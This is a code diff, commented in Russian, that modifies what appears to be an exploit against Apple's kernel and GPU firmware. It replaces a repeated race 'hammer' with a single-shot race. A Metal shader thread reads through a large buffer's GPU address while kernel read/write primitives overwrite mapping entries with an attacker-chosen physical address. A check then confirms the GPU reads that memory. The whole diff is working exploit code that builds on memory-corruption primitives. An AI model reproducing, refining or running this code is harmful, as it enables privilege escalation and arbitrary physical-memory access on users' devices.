@@ -5430,6 +5430,43 @@ static int gRaceN = 0;
 static uint64_t gRacePA = 0;
 static volatile int gRaceStop = 0;
 static volatile int gRaceGate = 0;   // флаг: писать ТОЛЬКО в окне жертвы
+
+// одиночный выстрел: состояние жертвы
+static volatile int gSubmitDone = 0;
+static uint64_t gBigVA = 0;
+static id<MTLBuffer> gRaceRes = nil;
+static void *kpVictimSubmit(void *arg)
+{
+    (void)arg;
+    @autoreleasepool {
+        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
+        id<MTLBuffer> big = [mtl newBufferWithLength:0x10000000 options:MTLResourceStorageModePrivate];
+        if (!big) { gSubmitDone = 1; return NULL; }
+        gBigVA = (uint64_t)big.gpuAddress;
+        NSError *err = nil;
+        id<MTLLibrary> lib = [mtl newLibraryWithSource:
+            @"kernel void cp(device ulong *dst [[buffer(0)]], device const ulong *va [[buffer(1)]]) { device const ulong *p = (device const ulong *)(*va); dst[0] = p[0]; }"
+            options:nil error:&err];
+        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"cp"] : nil;
+        id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
+        id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
+        if (!q) { gSubmitDone = 1; return NULL; }
+        ((volatile uint64_t *)gRaceRes.contents)[0] = 0;
+        ((volatile uint64_t *)gRaceRes.contents)[1] = gBigVA;
+        id<MTLCommandBuffer> cb = [q commandBuffer];
+        id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
+        [enc setComputePipelineState:pipe];
+        [enc setBuffer:gRaceRes offset:0 atIndex:0];
+        [enc setBuffer:gRaceRes offset:16 atIndex:1];
+        [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+        [enc endEncoding];
+        [cb commit];
+        [cb waitUntilCompleted];
+        gSubmitDone = 1;
+    }
+    return NULL;
+}
+
 static void *kpRaceHammer(void *arg)
 {
     (void)arg;
@@ -5575,41 +5612,36 @@ static void *kpListReaderMulti(void *arg)
     }
     GNOTE( [NSString stringWithFormat:@"  БАЗА: paX в 0x17 ДО гонки: %d %@", baseHits, baseHits ? @"(уже там?!)" : @"= 0, чисто"]);
 
-    // 4. молот + Metal-цикл носителя (20 сек): create private buf → submit → release
-    gRaceBufs[0] = bufVA; gRaceN = 1; gRacePA = paX; gRaceStop = 0;
-    pthread_t ht;
-    pthread_create(&ht, NULL, kpRaceHammer, NULL);
-    int iters = 0;
-    uint64_t t0 = (uint64_t)[NSDate timeIntervalSinceReferenceDate];
+    // 4. ОДИНОЧНЫЙ выстрел в широкое окно: 256 МБ буфер = fill идёт долго.
+    //    Тред A: submit (шейдер читает gvaB[0] → res[0]). Главный: ждём,
+    //    пока запись[0] ненулевая (fill активен) → ОДНА запись {1, paX} →
+    //    снова (до 50). Без молотилки: коррупции почти нет.
+    gSubmitDone = 0;
     {
-        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-        NSError *err = nil;
-        id<MTLLibrary> lib = [mtl newLibraryWithSource:@"kernel void wf(device ulong *o [[buffer(0)]]) { o[0] = 1; }" options:nil error:&err];
-        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"wf"] : nil;
-        id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
-        id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
-        if (q) {
-            while ((uint64_t)[NSDate timeIntervalSinceReferenceDate] - t0 < 20) {
-                @autoreleasepool {
-                    id<MTLBuffer> b = [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate];
-                    id<MTLCommandBuffer> cb = [q commandBuffer];
-                    id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
-                    [enc setComputePipelineState:pipe];
-                    [enc setBuffer:b offset:0 atIndex:0];
-                    [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
-                    [enc endEncoding];
-                    gRaceGate = 1;              // окно: только во время commit
-                    [cb commit];
-                    [cb waitUntilCompleted];
-                    gRaceGate = 0;
-                    iters++;
-                }
-            }
+        id<MTLDevice> mtl0 = MTLCreateSystemDefaultDevice();
+        gRaceRes = mtl0 ? [mtl0 newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
+        if (!gRaceRes) { GNOTE( @"FAIL: res buffer"); gGartLive = NO; return r; }
+    }
+    pthread_t vt;
+    pthread_create(&vt, NULL, kpVictimSubmit, NULL);
+    int writes = 0;
+    while (!gSubmitDone && writes < 50) {
+        uint64_t f0 = kp_rc_kread64(bufVA);          // запись[0].qword0
+        if (f0) {
+            kp_rc_kwrite64(bufVA + 8, 1);            // qword1=1 сначала
+            kp_rc_kwrite64(bufVA, paX);              // qword0 = paX
+            writes++;
         }
     }
-    gRaceStop = 1;
-    pthread_join(ht, NULL);
-    GNOTE( [NSString stringWithFormat:@"  носитель: %d итераций create+submit за ~20 сек", iters]);
+    pthread_join(vt, NULL);
+    GNOTE( [NSString stringWithFormat:@"  одиночный выстрел: %d записей в активные fill'ы", writes]);
+
+    // read-back: что шейдер прочитал по gvaB[0] большого буфера
+    uint64_t got = 0;
+    if (gRaceRes) got = ((volatile uint64_t *)gRaceRes.contents)[0];
+    GNOTE( [NSString stringWithFormat:@"  read-back gvaB=%#llx[0] → %#llx %@", gBigVA, got,
+               got == 0x4142434445464748ULL ? @"★★★ FW ЗАМАПИЛ НАШ phys — GPU ЧИТАЕТ ЕГО! ★★★" : @"(не маркер)"]);
+
 
     // 5. ПОСТ-скан 0x17 на paX
     int postHits = 0;
